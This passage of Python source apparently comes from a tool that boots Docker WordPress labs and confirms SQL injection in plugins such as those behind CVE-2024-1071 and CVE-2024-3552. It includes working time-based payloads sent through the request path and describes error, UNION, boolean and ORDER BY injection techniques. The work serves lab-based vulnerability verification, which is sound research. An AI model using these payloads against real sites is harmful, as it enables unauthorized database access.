            for line in desc_r.strip().split('\n')[1:]:  # skip header
                parts = [p.strip() for p in line.split('\t')]
                if len(parts) >= 4:
                    col_name, col_type, nullable = parts[0], parts[1], parts[2]
                    if nullable.upper() == 'NO' and 'auto_increment' not in line.lower():
                        # columna NOT NULL sin auto_increment → necesita valor
                        if 'int' in col_type.lower() or 'float' in col_type.lower() or 'decimal' in col_type.lower() or 'double' in col_type.lower():
                            nn_cols[col_name] = '1'
                        elif ('char' in col_type.lower() or 'text' in col_type.lower() or
                              'blob' in col_type.lower() or 'binary' in col_type.lower() or
                              'json' in col_type.lower()):
                            nn_cols[col_name] = "'seed'"
                        elif 'datetime' in col_type.lower() or 'timestamp' in col_type.lower():
                            nn_cols[col_name] = "NOW()"
                        elif 'date' in col_type.lower():
                            nn_cols[col_name] = "CURDATE()"
                        elif 'time' in col_type.lower():
                            nn_cols[col_name] = "CURTIME()"
                        elif 'enum' in col_type.lower() or 'set' in col_type.lower():
                            # Pick first value from ENUM definition e.g. enum('a','b')
                            import re as _re_col
                            _enum_m = _re_col.search(r"['\"]([^'\"]+)['\"]", col_type)
                            nn_cols[col_name] = f"'{_enum_m.group(1)}'" if _enum_m else "'0'"
            if nn_cols:
                cols = ', '.join(nn_cols.keys())
                vals = ', '.join(nn_cols.values())
                q_desc = f"INSERT IGNORE INTO {full} ({cols}) VALUES ({vals});"
                r2 = lab.exec_mysql(q_desc, db_pw)
                if r2 is not None:
                    inserted = True
        # Fallback 4: schema extraído del código PHP (más preciso que DESCRIBE porque conoce
        # los valores semánticos por nombre de columna y el valor real del param del PoC).
        if not inserted and plugin_source_dir:
            _schema = _extract_schema_from_plugin(plugin_source_dir)
            _schema_cols = _schema.get(tbl, [])
            if _schema_cols:
                _scol_names, _scol_vals = _schema_insert_values(
                    _schema_cols, sqli_param=sqli_param, sqli_param_value=sqli_param_value)
                if _scol_names:
                    _q_schema = (f"INSERT IGNORE INTO {full} "
                                 f"({', '.join(_scol_names)}) VALUES ({', '.join(_scol_vals)});")
                    r3 = lab.exec_mysql(_q_schema, db_pw)
                    if r3 is not None:
                        inserted = True
                        step(f"seed data (schema PHP): INSERT en {full} con "
                             f"{len(_scol_names)} columnas inferidas del CREATE TABLE")
        # Si el sqli_param coincide con una columna de texto común, actualizar esa columna
        # para que la fila seeded tenga un valor consultable (diferencial booleano más limpio).
        if inserted and sqli_param:
            _TEXT_COLS = {"uri": "/test-page", "page": "/", "url": "http://example.com",
                          "slug": "test-post", "path": "/test", "query": "test",
                          "email": "seed@example.com", "username": "seeduser",
                          "code": "SEED1", "token": "seedtoken", "key": "seedkey",
                          "hash": "seedhash", "ref": "seedref", "name": "seedname",
                          "title": "Seed Event", "event_name": "Seed Event",
                          "event_title": "Seed Event", "course_title": "Seed Course",
                          "booking_name": "Seed Booking", "post_title": "Seed Post",
                          "search": "seed", "keyword": "seed", "term": "seed",
                          "q": "seed", "s": "seed", "phrase": "seed"}
            # Si tenemos el valor real que usa el PoC, actualizar con ese valor concreto
            # para que el WHERE code='x' del PoC encuentre la fila seeded.
            _col_val = sqli_param_value if sqli_param_value else _TEXT_COLS.get(sqli_param.lower())
            if _col_val:
                _safe_val = _col_val.replace("'", "\\'")[:100]
                _upd = (f"UPDATE {full} SET {sqli_param}='{_safe_val}' "
                        f"WHERE id=(SELECT MIN(id) FROM (SELECT id FROM {full} LIMIT 1) t);")
                lab.exec_mysql(_upd, db_pw)
        # Cuando sqli_param_value es un email y sqli_param no es 'email', la columna a poblar
        # puede llamarse 'email' aunque el param HTTP se llame 'q' u otro nombre generico.
        # Siempre intentar actualizar la columna 'email' con el valor real (silencioso si no existe).
        if inserted and sqli_param_value and "@" in sqli_param_value and sqli_param.lower() != "email":
            _safe_em = sqli_param_value.replace("'", "\\'")[:100]
            lab.exec_mysql(
                f"UPDATE {full} SET email='{_safe_em}' "
                f"WHERE id=(SELECT MIN(id) FROM (SELECT id FROM {full} LIMIT 1) t);",
                db_pw)
        step(f"seed data: INSERT en {full} {'OK' if inserted else 'SKIP'} "
             f"(diferencial booleano en DB vacia)")
        seeded += 1

    # Bidirectional seed: if the plugin table has a FK column (post_id / event_id / etc.)
    # that links to wp_posts, create a WP post of the matching CPT type so queries that
    # JOIN against wp_posts find a real row. This fixes the empty-DB problem for plugins
    # like Events Manager (em_events.post_id → wp_posts) and WP Hotel Booking (hb_room).
    # Only attempt when we inserted at least one plugin-table row AND have source dir.
    if seeded > 0 and plugin_source_dir:
        import glob as _glob_bds
        import re as _re_bds
        _cpt_re2 = _re_bds.compile(
            r"register_post_type\s*\(\s*['\"]([a-z0-9_\-]{3,40})['\"]", _re_bds.I)
        _cpts: list = []
        for _phpf3 in _glob_bds.glob(str(plugin_source_dir) + "/**/*.php", recursive=True):
            try:
                _phpc3 = open(_phpf3, encoding="utf-8", errors="replace").read(60_000)
            except OSError:
                continue
            for _m3 in _cpt_re2.finditer(_phpc3):
                _ct3 = _m3.group(1)
                if _ct3 not in _cpts and _ct3 != "attachment":
                    _cpts.append(_ct3)
        if _cpts:
            # Check if we already created seed posts (via wp_posts rows in DB)
            _existing_posts = lab.exec_mysql(
                "SELECT COUNT(*) FROM wp_posts WHERE post_type IN ("
                + ", ".join(f"'{c}'" for c in _cpts[:6])
                + ") AND post_status='publish';", db_pw) or ""
            _existing_count = 0
            try:
                _existing_count = int(_existing_posts.strip().split('\n')[-1])
            except (ValueError, IndexError):
                pass
            if _existing_count == 0:
                # Create one seed post per CPT (up to 3) so JOIN queries find rows
                _post_id = 1
                _seeded_post_ids: list = []
                for _cpt_type in _cpts[:3]:
                    _r_ins = lab.exec_mysql(
                        f"INSERT INTO wp_posts "
                        f"(post_title, post_status, post_type, post_name, guid, post_date, post_date_gmt, "
                        f"post_modified, post_modified_gmt, to_ping, pinged, post_content_filtered) "
                        f"VALUES ('Seed {_cpt_type}', 'publish', '{_cpt_type}', "
                        f"'seed-{_cpt_type}', 'seed-{_cpt_type}', NOW(), NOW(), NOW(), NOW(), '', '', '');",
                        db_pw) or ""
                    # Retrieve the actual auto-increment ID assigned
                    _id_r = lab.exec_mysql("SELECT LAST_INSERT_ID();", db_pw) or ""
                    try:
                        _post_id = int(_id_r.strip().split('\n')[-1])
                        _seeded_post_ids.append((_post_id, _cpt_type))
                    except (ValueError, IndexError):
                        _post_id = 1
                step(f"seed: WP posts creados para CPTs {_cpts[:3]} (ID={_post_id}, JOIN FK seed)")
                # For order-like CPTs (stm-orders, shop_order, etc.), seed postmeta so
                # plugins that filter by meta_key='status'/meta_value='completed' find rows.
                # Without this, LEFT JOIN on postmeta returns NULL and the WHERE filters out all rows.
                _ORDER_CPT_HINTS = ("order", "booking", "reservation", "ticket", "invoice",
                                    "purchase", "transaction", "payment", "sale")
                for _spost_id, _spost_type in _seeded_post_ids:
                    if any(_h in _spost_type.lower() for _h in _ORDER_CPT_HINTS):
                        lab.exec_mysql(
                            f"INSERT IGNORE INTO wp_postmeta (post_id, meta_key, meta_value) "
                            f"VALUES ({_spost_id}, 'status', 'completed'), "
                            f"({_spost_id}, '_order_total', '99.00'), "
                            f"({_spost_id}, 'user_id', '1');",
                            db_pw)
                        step(f"seed postmeta: status=completed para {_spost_type} ID={_spost_id}")
                # Update FK columns in plugin tables to reference the seeded post
                # so queries like `WHERE post_id = X` find the row.
                _fk_col_names = ("post_id", "event_id", "booking_id", "product_id",
                                  "room_id", "course_id", "lesson_id", "item_id")
                for _tbl_name in tables[:8]:
                    _ft = f"wp_{_tbl_name}"
                    for _fk in _fk_col_names:
                        lab.exec_mysql(
                            f"UPDATE {_ft} SET {_fk}={_post_id} "
                            f"WHERE ({_fk}=0 OR {_fk} IS NULL);",
                            db_pw)
                # For order-related FK columns (order_id, parent_order_id), overwrite
                # ALL rows to point to the actual order-type post ID.
                # Needed because the DESCRIBE-based INSERT uses placeholder value=1,
                # but the stm-orders post auto-increment ID may differ.
                _ORDER_FK_COLS = ("order_id", "parent_order_id", "wc_order_id")
                for _spost_id2, _spost_type2 in _seeded_post_ids:
                    if any(_h in _spost_type2.lower() for _h in _ORDER_CPT_HINTS):
                        for _tbl_name in tables[:8]:
                            _ft = f"wp_{_tbl_name}"
                            for _ofk in _ORDER_FK_COLS:
                                lab.exec_mysql(
                                    f"UPDATE {_ft} SET {_ofk}={_spost_id2};",
                                    db_pw)
                        step(f"seed order_id FK: tablas plugin → {_spost_type2} ID={_spost_id2}")
                        break

    return seeded


def verify_wordpress_sqli(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, sqli_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    setup_wp_options: Optional[list] = None,
    companion_plugins: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    relationship_table: Optional[dict] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    keep_lab_on_failure: bool = False,
    _live_boot: Optional["_LabSession"] = None,
    _boot_ref: Optional[list] = None,
    _lab_ref: Optional[list] = None,
    json_body: bool = False,
    required_role: str = "subscriber",
    sqli_via_request_uri: bool = False,
    sqli_via_rawurldecode: bool = False,
    sqli_via_orderby: bool = False,
    _tried_params_set: Optional[frozenset] = None,
    sqli_header_hint: str = "",
    seed_sql: Optional[list] = None,
    nonce_action: str = "",
) -> WpVerifyResult:
    """Verifica SQL injection con CINCO tecnicas, de mas a menos dura, probando varios contextos
    de inyeccion (numerico sin comillas, comilla simple, comilla doble, cierre de parentesis) y
    estilos de comentario (-- -, #) en cada una, porque el contexto real del query no se puede
    saber sin leer el codigo:

    1) error-based (prueba dura, mas rapida -- sin fuerza bruta de columnas): extractvalue()/
       updatexml() provocan un error de sintaxis XPATH cuyo mensaje INCLUYE el resultado de la
       subconsulta; si version() aparece en la respuesta por esta via, es dato real forzado a
       salir en un mensaje de error, no una coincidencia.
    2) UNION-based (prueba dura): fuerza bruta del numero de columnas (1-8) probando `version()`
       en cada posicion, para cada contexto/comentario; si una version REAL del motor (que no
       estaba en la respuesta base) aparece en la respuesta, es dato extraido de verdad de la
       base de datos -- no una deduccion.
    3) boolean-blind diferencial (mas debil, solo si (1) y (2) no filtraron nada): compara pares
       de condiciones TRUE/FALSE inyectadas; se marca verificado solo si al menos 2 de 3 pares
       muestran una diferencia de respuesta CONSISTENTE y el caso TRUE se comporta como la
       peticion de control.
    4) time-based blind (contexto WHERE, solo si (1)-(3) no funcionaron): SLEEP(5) vs SLEEP(0)
       en la misma condicion -- si el retraso es consistente en al menos 2 de 3 pares, es
       indicio de inyeccion ciega sin ninguna diferencia visible en el contenido.
    5) contexto ORDER BY (ultimo recurso, solo si (1)-(4) no funcionaron): las 4 tecnicas
       anteriores asumen que el valor original sigue formando parte de una clausula WHERE real
       (el payload es '<valor><cierre> AND/OR <condicion>') -- un sumidero que mete el
       parametro DIRECTAMENTE en un ORDER BY (p.ej. WP_User_Query 'orderby' sin whitelist --
       confirmado en vivo contra CVE-2024-1071, Ultimate Member, parametro 'sorting') nunca
       puede confirmarse asi: no hay WHERE al que concatenar nada, y una comilla solo rompe la
       sintaxis de la columna/expresion en vez de cerrar una cadena. Aqui el valor INYECTADO ES
       la expresion COMPLETA (subconsulta escalar, sin AND/OR/comillas/comentario): primero
       error-based (extractvalue/updatexml bare), luego time-based CONDICIONAL (CASE WHEN
       1=1/1=2, mismo SLEEP -- mas riguroso que un SLEEP incondicional: aisla que una CONDICION
       real controla el retraso, no que la posicion simplemente acepte 'SLEEP' sin mas). Nunca
       exclusivo de este plugin -- cualquier columna/orderby dinamico sin whitelist cae en el
       mismo patron.

    `detail` deja explicito con cual de las tecnicas se confirmo, para que el analista sepa que
    tan dura es la prueba.

    `shortcode_name`, si se da y `endpoint` es la raiz ('/' o vacio -- la portada por defecto,
    sin contenido del plugin), ataca en su lugar una pagina real creada con `[shortcode_name]`
    (ver _bootstrap_lab) -- confirmado en vivo, CVE-2024-3552: sin una pagina que de verdad
    invoque el plugin, ninguna tecnica puede mostrar una diferencia visible aunque la inyeccion
    sea real, porque no hay ninguna superficie donde el resultado del query pueda reflejarse.

    `relationship_table`, si se da junto a `shortcode_name`, inserta una fila real para la
    pagina del shortcode en la tabla de relacion propia del plugin ANTES del ataque (ver
    find_join_relationship_table() en websource.py y _bootstrap_lab) -- confirmado en vivo,
    CVE-2024-3552: el sumidero real estaba detras de un LEFT JOIN por post ID contra una tabla
    de relacion, y una pagina SIN fila ahi sale siempre NULL en esa columna -- el WHERE nunca es
    verdadero, inyeccion real o no.

    `extra_nonce_pages`, si se da, son rutas adicionales (p.ej. '/register/') a probar para
    rascar un nonce real, ADEMAS de la portada y de todas las paginas ya publicadas que esta
    funcion enumera por su cuenta (ver _list_real_page_urls) -- pensado para que el bucle de
    aprendizaje-y-reintento del LLM (cve_agent.py, _SQLI_RETRY_SYS) pueda señalar una pagina
    CONCRETA cuando la enumeracion automatica no la cubrio (p.ej. porque el README del PoC
    publico la nombra explicitamente) en vez de rendirse solo porque el scraping determinista no
    la encontro.

    `extra_setup_trigger_paths` (ver _bootstrap_lab): rutas EXTRA a visitar como admin tras el
    login, ademas de las ya conocidas para este plugin en _PLUGIN_SETUP_TRIGGER_PATHS -- cuando
    NINGUNA pagina probada muestra rastro del plugin (ver 'nonce_scraping_diagnostico' en la
    evidencia), el LLM del bucle de reintento puede reconocer que ESTE plugin necesita un paso
    de configuracion propio y señalar la URL que lo dispara, aunque no sea un plugin ya conocido
    en el registro.

    `keep_lab_on_failure`, si se da y la inyeccion NO se confirmo, deja el laboratorio Docker
    VIVO en vez de desmontarlo -- las 5 tecnicas automaticas no pueden ver el error real de
    MySQL cuando el propio plugin lo captura y responde con JSON "limpio" en vez de dejarlo
    salir en el cuerpo HTTP (confirmado en vivo, CVE-2024-1071: WP_DEBUG_DISPLAY activo no basta
    si el handler AJAX nunca deja que WordPress pinte el error) -- en ese caso, seguir
    adivinando payloads a ciegas no avanza nada; hace falta mirar `wp-content/debug.log` DENTRO
    del contenedor a mano. Con esto activo, `res.evidence['laboratorio_vivo']` trae la URL base
    y las credenciales de admin para que el analista pueda hacer ese `docker exec` el mismo --
    el analista (o un comando aparte) es quien debe desmontarlo despues; binoracle NUNCA lo
    hace automaticamente con esta opcion puesta, para no destruir la pista antes de que de
    tiempo a mirarla."""
    step = on_step or (lambda _m: None)
    # Prune orphaned binoracle lab resources from previous crashed/incomplete runs.
    # Each lab creates containers/networks/volumes tagged with a unique run ID; if the
    # process dies before teardown() the resources are left dangling. Remove them before
    # starting a new run so they don't accumulate and waste disk space.
    try:
        import subprocess as _sp
        _prune_v = _sp.run(
            ["docker", "volume", "ls", "--format", "{{.Name}}"],
            capture_output=True, text=True, timeout=10
        )
        for _vname in (_prune_v.stdout or "").splitlines():
            if _vname.startswith("binoracle-wpverify-") and _vname.endswith("-html"):
                _sp.run(["docker", "volume", "rm", "-f", _vname],
                        capture_output=True, timeout=10)
        _prune_c = _sp.run(
            ["docker", "ps", "-a", "--format", "{{.Names}}"],
            capture_output=True, text=True, timeout=10
        )
        for _cname in (_prune_c.stdout or "").splitlines():
            if _cname.startswith("binoracle-wpverify-") or _cname.startswith("binoracle-lab-"):
                _sp.run(["docker", "rm", "-fv", _cname], capture_output=True, timeout=10)
        # Prune anonymous volumes left by MySQL containers from crashed runs where teardown
        # never executed. These volumes have no name and cannot be matched by prefix, but
        # docker volume prune -f removes only dangling (unused) volumes — safe to call here.
        _sp.run(["docker", "volume", "prune", "-f"], capture_output=True, timeout=30)
    except Exception:
        pass
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    _sqli_param_from_hints = bool(sqli_param_hint or _pick_param(parameters, _SQLI_HINTS))
    sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
    # Guard: if the chosen param's base value looks like a structural identifier (short hex hash
    # or pure integer), it's probably a lookup key (e.g. directory_id=f3e71 in Ultimate Member),
    # not the injection point. Prefer a sort*/order* param if one exists.
    if sqli_param and isinstance(parameters, dict):
        _spg_val = str(parameters.get(sqli_param, ""))
        _spg_name_lc = sqli_param.lower()
        _spg_struct_name = bool(re.search(
            r'(?:_id|_hash|directory|resource|hash|token)', _spg_name_lc))
        _is_structural = bool(
            (re.match(r'^[a-f0-9]{4,16}$', _spg_val) and _spg_struct_name) or  # hex hash
            (re.match(r'^\d{1,10}$', _spg_val) and _spg_struct_name)            # integer id
        )
        if _is_structural:
            _sort_alt = _pick_param(parameters, ("sort", "order", "orderby", "sorting", "filter"))
            if _sort_alt and _sort_alt != sqli_param:
                step(f"sqli_param corregido '{sqli_param}' → '{_sort_alt}' "
                     f"('{sqli_param}'={_spg_val!r} parece identificador/hash estructural, "
                     f"no param de inyeccion; priorizando '{_sort_alt}')")
                sqli_param = _sort_alt
                _sqli_param_from_hints = True
    if not sqli_param:
        res.detail = "no se identifico el parametro a inyectar"
        res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
                               "'parameters' en la hipotesis del LLM o pasalo a mano "
                               "(sqli_param_hint)")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        attack_endpoint_is_bare_root = (endpoint or "/").strip() in ("", "/")
        # shortcode_name se crea SIEMPRE que se dio (no solo cuando se ataca la raiz): aunque el
        # ataque real vaya contra un endpoint AJAX propio (p.ej. admin-ajax.php?action=...), la
        # pagina con el shortcode del plugin es de donde _auto_resolve_wp_blockers rasca el nonce
        # REAL de esa accion -- confirmado en vivo, CVE-2024-1071 (Ultimate Member): sin una
        # pagina real que invoque [ultimatemember_directory], ninguna pagina del sitio (login,
        # portada) tiene el nonce especifico de 'um_get_members', y el ataque falla siempre con
        # "Wrong Nonce" aunque el parametro/payload sean correctos. relationship_table, en
        # cambio, solo tiene sentido cuando se ataca la propia pagina del shortcode (ver mas
        # abajo), asi que sigue atado a ese caso.
        if _live_boot is not None:
            # Persistent-lab fast path: reuse an already-bootstrapped lab session.
            # Docker containers stay alive; only the probe logic re-runs.
            # WP_DEBUG_DISPLAY is set right after this block so it still runs
            # (idempotent — harmless to repeat on each retry).
            boot = _live_boot
        else:
            boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                                  setup_wp_options=setup_wp_options,
                                  companion_plugins=companion_plugins,
                                  shortcode_name=shortcode_name,
                                  relationship_table=relationship_table if attack_endpoint_is_bare_root else None,
                                  extra_setup_trigger_paths=extra_setup_trigger_paths,
                                  required_role=required_role)
            if boot is None:
                return res
            # Expose boot + lab to caller for persistent-lab mode
            if _boot_ref is not None:
                _boot_ref.append(boot)
            if _lab_ref is not None:
                _lab_ref.append(lab)
        # WP_DEBUG_DISPLAY se activa AQUI, DESPUES de que el login del subscriber ya haya
        # funcionado -- no en _bootstrap_lab (antes del login). Bug real encontrado en vivo,
        # CVE-2024-1071 (Ultimate Member), en una demo real: activarlo DESDE el bootstrap
        # (antes del login) seguia rompiendo la cookie de sesion exactamente igual que antes
        # del primer fix -- un aviso de PHP totalmente ajeno a la inyeccion (el propio plugin
        # cargando su dominio de traduccion demasiado pronto) se imprimia ANTES del
        # Set-Cookie del login, sin importar que _bootstrap_lab por defecto ya puesto
        # WP_DEBUG_DISPLAY=false para todos los DEMAS verificadores -- SQLi es precisamente
        # el que lo necesita true, asi que el problema seguia aqui mismo. Con el login YA
        # hecho (boot.sub_sess trae la cookie de sesion real), activar el display despues no
        # puede romper nada que ya se completo.
        lab.wp_cli("config", "set", "WP_DEBUG_DISPLAY", "true", "--raw", "--type=constant",
                  timeout=30)
        # WP_DEBUG=true activa el display de errores PHP pero NO llama $wpdb->show_errors()
        # en WordPress 5.0+. Los errores MySQL apareceran en el response porque el mu-plugin
        # binoracle-sqli-debug.php instalado en boot_wordpress_lab() llama show_errors() en
        # cada peticion. Esta linea solo asegura WP_DEBUG=true por coherencia.
        lab.wp_cli("config", "set", "WP_DEBUG", "true", "--raw", "--type=constant",
                  timeout=30)

        # Preliminary orig_value used by REQUEST_URI fast-path; full derivation happens below.
        orig_value = str((parameters.get(sqli_param) if isinstance(parameters, dict) else "") or "")

        # REQUEST_URI injection fast-path: cuando el taint source es $_SERVER['REQUEST_URI'],
        # la inyeccion va en el PATH HTTP (no en query param). Tecnica: raw socket con
        # comilla literal + /**/ como espacio SQL. Solo time-based blind (error/boolean no
        # afloran via 404 HTML).
        if sqli_via_request_uri:
            step("modo REQUEST_URI activo: inyeccion via path HTTP (raw socket)")
            # Habilitar pretty permalinks para que WordPress PHP procese cualquier path
            lab.wp_cli("rewrite", "structure", "/%postname%/", timeout=30)
            lab.wp_cli("rewrite", "flush", "--hard", timeout=30)
            step("pretty permalinks habilitados (necesarios para que template_redirect dispare)")

            # Seed al menos una fila en las tablas del plugin para que el query SQL
            # tenga filas que evaluar (LEFT JOIN no evalua ON si la tabla izquierda esta vacia)
            _plugin_tables_uri = _detect_plugin_tables(plugin_source_dir)
            if _plugin_tables_uri:
                _seed_plugin_tables(lab, boot.db_pw, _plugin_tables_uri, step,
                                    sqli_param=sqli_param,
                                    sqli_param_value=orig_value,
                                    plugin_source_dir=plugin_source_dir)
                step(f"seed data insertado en tablas del plugin: {_plugin_tables_uri}")
            else:
                # Seed generico: buscar tablas plugin via MySQL LIKE
                _slug_clean = re.sub(r'[^a-z0-9]', '', slug.lower()) if slug else ""
                if _slug_clean:
                    _mt = lab.exec_mysql(
                        f"SELECT table_name FROM information_schema.tables WHERE "
                        f"table_schema=DATABASE() AND table_name LIKE 'wp_%{_slug_clean}%';",
                        boot.db_pw)
                    if _mt:
                        _mt_names = [t.strip().lstrip('wp_') for t in _mt.strip().split('\n')
                                     if t.strip().startswith('wp_')]
                        if _mt_names:
                            _seed_plugin_tables(lab, boot.db_pw, _mt_names, step,
                                                sqli_param=sqli_param,
                                                sqli_param_value=orig_value,
                                                plugin_source_dir=plugin_source_dir)
                            step(f"seed via MySQL LIKE: {_mt_names}")

            # CPT seed for plugins that store data as WP posts (no custom tables).
            # Triggered always if plugin_source_dir is available, regardless of whether
            # custom tables were found — covers WP Hotel Booking (hb_room CPT),
            # Course Booking System (course CPT), Events Manager (event CPT), etc.
            if plugin_source_dir:
                import glob as _glob_cpt, re as _re_cpt
                _cpt_re = _re_cpt.compile(
                    r"register_post_type\s*\(\s*['\"]([a-z0-9_\-]{3,40})['\"]", _re_cpt.I)
                _cpt_types: list = []
                for _phpf in _glob_cpt.glob(str(plugin_source_dir) + "/**/*.php", recursive=True):
                    try:
                        _phpc = open(_phpf, encoding="utf-8", errors="replace").read(60_000)
                    except OSError:
                        continue
                    for _mc in _cpt_re.finditer(_phpc):
                        _ct = _mc.group(1)
                        if _ct not in _cpt_types and _ct != "attachment":
                            _cpt_types.append(_ct)
                if _cpt_types:
                    _cpt_check = lab.exec_mysql(
                        "SELECT COUNT(*) FROM wp_posts WHERE post_type IN ("
                        + ", ".join(f"'{c}'" for c in _cpt_types[:6])
                        + ") AND post_status='publish';", boot.db_pw) or ""
                    _cpt_count = 0
                    try:
                        _cpt_count = int(_cpt_check.strip().split('\n')[-1])
                    except (ValueError, IndexError):
                        pass
                    if _cpt_count == 0:
                        _ORDER_HINTS_CPT = ("order", "booking", "reservation", "ticket",
                                            "invoice", "purchase", "transaction", "payment")
                        for _cpt in _cpt_types[:3]:
                            lab.exec_mysql(
                                f"INSERT INTO wp_posts "
                                f"(post_title, post_status, post_type, post_name, guid, "
                                f"post_date, post_date_gmt, post_modified, post_modified_gmt, "
                                f"to_ping, pinged, post_content_filtered) "
                                f"VALUES ('Seed {_cpt}', 'publish', '{_cpt}', "
                                f"'seed-{_cpt}', 'seed-{_cpt}', NOW(), NOW(), NOW(), NOW(), "
                                f"'', '', '');", boot.db_pw)
                            # For order-like CPTs, also add postmeta so queries filtering
                            # by meta_key='status'/meta_value='completed' find rows
                            if any(_oh in _cpt.lower() for _oh in _ORDER_HINTS_CPT):
                                _id_cpt_r = lab.exec_mysql("SELECT LAST_INSERT_ID();", boot.db_pw) or ""
                                try:
                                    _last_cpt_id = int(_id_cpt_r.strip().split('\n')[-1])
                                    lab.exec_mysql(
                                        f"INSERT IGNORE INTO wp_postmeta (post_id, meta_key, meta_value) "
                                        f"VALUES ({_last_cpt_id}, 'status', 'completed'), "
                                        f"({_last_cpt_id}, '_order_total', '99.00'), "
                                        f"({_last_cpt_id}, 'user_id', '1');", boot.db_pw)
                                    step(f"seed CPT postmeta: status=completed para {_cpt} ID={_last_cpt_id}")
                                except (ValueError, IndexError):
                                    pass
                        step(f"seed CPT: wp_posts insertados para tipos {_cpt_types[:3]}")
                        res.evidence["cpt_seed_realizado"] = _cpt_types[:3]
                    elif _cpt_count > 0:
                        res.evidence["cpt_seed_ya_existia"] = _cpt_types[:3]

            # Run any seed_sql statements from the CVE JSON (custom table population).
            # Needed for plugins whose SQLi endpoint queries custom tables (not wp_posts):
            # WP Hotel Booking (hb_room posts), Events Manager (em_events), etc.
            # All statements run in a SINGLE mysql -e call so session vars (@room_id) persist.
            if seed_sql:
                # Fix INSERT IGNORE + LAST_INSERT_ID pattern for CPT/wp_posts rows:
                # INSERT IGNORE returns LAST_INSERT_ID()=0 when the row already exists.
                # Converting to ON DUPLICATE KEY UPDATE ID=LAST_INSERT_ID(ID) ensures
                # LAST_INSERT_ID() always returns the row's real ID (new or existing).
                import re as _re_seed
                _seed_fixed = []
                for _ss in seed_sql:
                    _ss_up = _ss.upper()
                    if (_re_seed.search(r'INSERT\s+IGNORE\s+INTO\s+wp_posts\b', _ss, _re_seed.I)
                            and 'ON DUPLICATE KEY' not in _ss_up):
                        _ss = _re_seed.sub(r'INSERT\s+IGNORE\s+INTO', 'INSERT INTO', _ss,
                                           count=1, flags=_re_seed.I)
                        _ss = _ss.rstrip(';').rstrip() + ' ON DUPLICATE KEY UPDATE ID=LAST_INSERT_ID(ID)'
                    _seed_fixed.append(_ss)
                _all_seed = "\n".join(s.rstrip(";").strip() + ";" for s in _seed_fixed if s.strip())
                _ssql_r = lab.exec_mysql(_all_seed, boot.db_pw)
                step(f"seed_sql: {len(seed_sql)} statements → {'OK' if _ssql_r is not None else 'ERROR'}")
                if _ssql_r is None:
                    step("seed_sql ADVERTENCIA: algunos statements fallaron — el lab sigue")
                res.evidence["seed_sql_ejecutado"] = len(seed_sql)

            import socket as _sock_uri, time as _time_uri

            def _raw_path_request(path: str, timeout: float = 20.0) -> float:
                """Envia GET {path} via raw socket (sin URL-encoding) y mide el tiempo."""
                host_uri = "localhost"
                port_uri = int(boot.base_url.split(":")[-1]) if ":" in boot.base_url else 80
                s = _sock_uri.socket(_sock_uri.AF_INET, _sock_uri.SOCK_STREAM)
                s.settimeout(timeout)
                t0 = _time_uri.time()
                try:
                    s.connect((host_uri, port_uri))
                    req_line = f"GET {path} HTTP/1.1\r\nHost: {host_uri}:{port_uri}\r\nConnection: close\r\n\r\n"
                    s.sendall(req_line.encode("latin-1", errors="replace"))
                    buf = b""
                    while True:
                        try:
                            chunk = s.recv(4096)
                            if not chunk:
                                break
                            buf += chunk
                        except _sock_uri.timeout:
                            break
                except Exception:
                    pass
                finally:
                    s.close()
                return _time_uri.time() - t0

            # Payloads: OR para forzar evaluacion aunque la condicion de page_url sea FALSE
            # La comilla cierra la cadena, OR SLEEP evalua siempre (no depende del contenido de la tabla)
            _uri_pairs = [
                # OR variant (fuerza evaluacion en cualquier contexto de clausula)
                (f"/{orig_value or 'x'}'/**/OR/**/(SELECT/**/3/**/FROM/**/(SELECT/**/SLEEP(5))A)--",
                 f"/{orig_value or 'x'}'/**/OR/**/(SELECT/**/3/**/FROM/**/(SELECT/**/SLEEP(0))A)--"),
                # AND variant (funciona si la condicion previa ya es TRUE)
                (f"/{orig_value or 'x'}'/**/AND/**/(SELECT/**/3/**/FROM/**/(SELECT/**/SLEEP(5))A)--",
                 f"/{orig_value or 'x'}'/**/AND/**/(SELECT/**/3/**/FROM/**/(SELECT/**/SLEEP(0))A)--"),
            ]

            _uri_timing_tried = []
            _uri_consistent = 0
            for _slow_p, _fast_p in _uri_pairs:
                step(f"probando path injection: SLOW={_slow_p!r}")
                _t_fast = _raw_path_request(_fast_p, timeout=10)
                _t_slow = _raw_path_request(_slow_p, timeout=25)
                _delayed = (_t_slow - _t_fast) >= 3.5
                _uri_timing_tried.append({
                    "slow": _slow_p, "fast": _fast_p,
                    "slow_s": round(_t_slow, 2), "fast_s": round(_t_fast, 2),
                    "retraso_consistente": _delayed,
                })
                step(f"  SLEEP(5)={_t_slow:.2f}s SLEEP(0)={_t_fast:.2f}s "
                     f"→ {'RETRASO!' if _delayed else 'sin retraso'}")
                if _delayed:
                    _uri_consistent += 1
                    break  # Un par confirmado es suficiente

            res.evidence["uri_timing_intentos"] = _uri_timing_tried
            if _uri_consistent >= 1:
                res.verified = True
                res.ok = True
                _uri_win = next(t for t in _uri_timing_tried if t["retraso_consistente"])
                res.evidence["tecnica"] = "request-uri-sqli-time-blind"
                res.evidence["sqli_param"] = "REQUEST_URI"
                res.evidence["endpoint"] = "/"
                res.detail = (f"SQLI CONFIRMADO (time-based blind via REQUEST_URI): "
                              f"SLEEP(5)={_uri_win['slow_s']}s vs SLEEP(0)={_uri_win['fast_s']}s "
                              f"(diferencial={_uri_win['slow_s']-_uri_win['fast_s']:.2f}s)")
                step(f"VERIFICADO: REQUEST_URI SQLi — {res.detail}")
                # Build PoC para el informe
                _uri_poc_path = _uri_win["slow"]
                res.exploit_poc = (
                    f"# CVE via REQUEST_URI path injection\n"
                    f"# SLEEP(5) response vs SLEEP(0) control\n"
                    f"# Target: {boot.base_url}\n\n"
                    f"python3 -c \"\nimport socket, time\n"
                    f"def probe(path):\n"
